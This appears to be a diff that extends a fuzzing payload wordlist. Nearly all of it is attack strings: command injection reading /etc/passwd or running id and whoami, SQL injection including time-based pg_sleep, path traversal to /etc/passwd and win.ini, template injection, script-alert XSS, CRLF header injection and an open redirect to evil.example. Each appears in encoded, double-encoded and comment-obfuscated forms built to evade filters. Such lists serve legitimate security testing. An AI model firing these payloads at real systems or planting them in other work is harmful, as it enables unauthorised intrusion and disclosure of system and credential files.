@@ -78,3 +78,165 @@ HTTP%3A%2F%2F127.0.0.1
 HTTPS%3A%2F%2FEXAMPLE.COM
 ' OR '1'%3D'1
 " OR "1"%3D"1
+%253Bid
+;id?aurose=1
+;id&aurose=1
+%2526%2526%2520id
+&&/**/id
+&& id?aurose=1
+&& id&aurose=1
+%257C%2520id
+|/**/id
+| id?aurose=1
+| id&aurose=1
+%2524%2528id%2529
+$(id)?aurose=1
+$(id)&aurose=1
+%2560id%2560
+`id`?aurose=1
+`id`&aurose=1
+%253Bcat%2520%252Fetc%252Fpasswd
+;cat/**//etc/passwd
+;cat /etc/passwd?aurose=1
+;cat /etc/passwd&aurose=1
+|| ping -c 1 127.0.0.1
+%7C%7C%20ping%20-c%201%20127.0.0.1
+%257C%257C%2520ping%2520-c%25201%2520127.0.0.1
+||/**/ping/**/-c/**/1/**/127.0.0.1
+|| PING -C 1 127.0.0.1
+|| ping -c 1 127.0.0.1?aurose=1
+|| ping -c 1 127.0.0.1&aurose=1
+%2526%2520whoami
+&/**/whoami
+& whoami?aurose=1
+& whoami&aurose=1
+%253Buname%2520-a
+;uname/**/-a
+;uname -a?aurose=1
+;uname -a&aurose=1
+;nslookup example.com
+%3Bnslookup%20example.com
+%253Bnslookup%2520example.com
+;nslookup/**/example.com
+;NSLOOKUP EXAMPLE.COM
+;nslookup example.com?aurose=1
+;nslookup example.com&aurose=1
+%2527%2520OR%2520%25271%2527%253D%25271
+'/**/OR/**/'1'='1
+' OR '1'%3d'1
+' OR '1'='1?aurose=1
+' OR '1'='1&aurose=1
+%2522%2520OR%2520%25221%2522%253D%25221
+"/**/OR/**/"1"="1
+" OR "1"%3d"1
+" OR "1"="1?aurose=1
+" OR "1"="1&aurose=1
+' AND 1=1 --
+%27%20AND%201%3D1%20--
+%2527%2520AND%25201%253D1%2520--
+'/**/AND/**/1=1/**/--
+' AND 1%3d1 --
+' AND 1=1 --?aurose=1
+' AND 1=1 --&aurose=1
+' AND 1=2 --
+%27%20AND%201%3D2%20--
+%2527%2520AND%25201%253D2%2520--
+'/**/AND/**/1=2/**/--
+' AND 1%3d2 --
+' AND 1=2 --?aurose=1
+' AND 1=2 --&aurose=1
+..%252F..%252F..%252F..%252Fetc%252Fpasswd
+../../../../etc/passwd?aurose=1
+../../../../etc/passwd&aurose=1
+..%255C..%255C..%255C..%255Cwindows%255Cwin.ini
+..\..\..\..\windows\win.ini?aurose=1
+..\..\..\..\windows\win.ini&aurose=1
+%2524%257B7%252A7%257D
+${7*7}?aurose=1
+${7*7}&aurose=1
+%257B%257B7%252A7%257D%257D
+{{7*7}}?aurose=1
+{{7*7}}&aurose=1
+<script>alert(document.domain)</script>
+%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+%253Cscript%253Ealert%2528document.domain%2529%253C%252Fscript%253E
+<SCRIPT>ALERT(DOCUMENT.DOMAIN)</SCRIPT>
+<script>alert(document.domain)</script>?aurose=1
+<script>alert(document.domain)</script>&aurose=1
+';SELECT pg_sleep(2)--
+%27%3BSELECT%20pg_sleep%282%29--
+%2527%253BSELECT%2520pg_sleep%25282%2529--
+';SELECT/**/pg_sleep(2)--
+';SELECT PG_SLEEP(2)--
+';SELECT pg_sleep(2)--?aurose=1
+';SELECT pg_sleep(2)--&aurose=1
+${IFS}
+%24%7BIFS%7D
+%2524%257BIFS%257D
+${IFS}?aurose=1
+${IFS}&aurose=1
+%0d%0aX-Aurose: 1
+%250d%250aX-Aurose%3A%201
+%25250d%25250aX-Aurose%253A%25201
+%0d%0aX-Aurose:/**/1
+%0D%0AX-AUROSE: 1
+%0d%0aX-Aurose: 1?aurose=1
+%0d%0aX-Aurose: 1&aurose=1
+https://example.com/?next=https://evil.example
+https%3A%2F%2Fexample.com%2F%3Fnext%3Dhttps%3A%2F%2Fevil.example
+https%253A%252F%252Fexample.com%252F%253Fnext%253Dhttps%253A%252F%252Fevil.example
+https://example.com/?next%3dhttps://evil.example
+HTTPS://EXAMPLE.COM/?NEXT=HTTPS://EVIL.EXAMPLE
+https://example.com/?next=https://evil.example?aurose=1
+https://example.com/?next=https://evil.example&aurose=1
+;id::var0
+%3Bid::v0
+/cmd/probe/0
+&& id::var1
+%26%26%20id::v1
+/cmd/probe/1
+| id::var2
+%7C%20id::v2
+/cmd/probe/2
+$(id)::var3
+%24%28id%29::v3
+/cmd/probe/3
+`id`::var4
+%60id%60::v4
+/cmd/probe/4
+;cat /etc/passwd::var5
+%3Bcat%20%2Fetc%2Fpasswd::v5
+/cmd/probe/5
+|| ping -c 1 127.0.0.1::var6
+%7C%7C%20ping%20-c%201%20127.0.0.1::v6
+/cmd/probe/6
+& whoami::var7
+%26%20whoami::v7
+/cmd/probe/7
+;uname -a::var8
+%3Buname%20-a::v8
+/cmd/probe/8
+;nslookup example.com::var9
+%3Bnslookup%20example.com::v9
+/cmd/probe/9
+' OR '1'='1::var10
+%27%20OR%20%271%27%3D%271::v10
+/cmd/probe/10
+" OR "1"="1::var11
+%22%20OR%20%221%22%3D%221::v11
+/cmd/probe/11
+' AND 1=1 --::var12
+%27%20AND%201%3D1%20--::v12
+/cmd/probe/12
+' AND 1=2 --::var13
+%27%20AND%201%3D2%20--::v13
+/cmd/probe/13
+../../../../etc/passwd::var14
+..%2F..%2F..%2F..%2Fetc%2Fpasswd::v14
+/cmd/probe/14
+..\..\..\..\windows\win.ini::var15
+..%5C..%5C..%5C..%5Cwindows%5Cwin.ini::v15
+/cmd/probe/15
+${7*7}::var16
+%24%7B7%2A7%7D::v16
+/cmd/probe/16
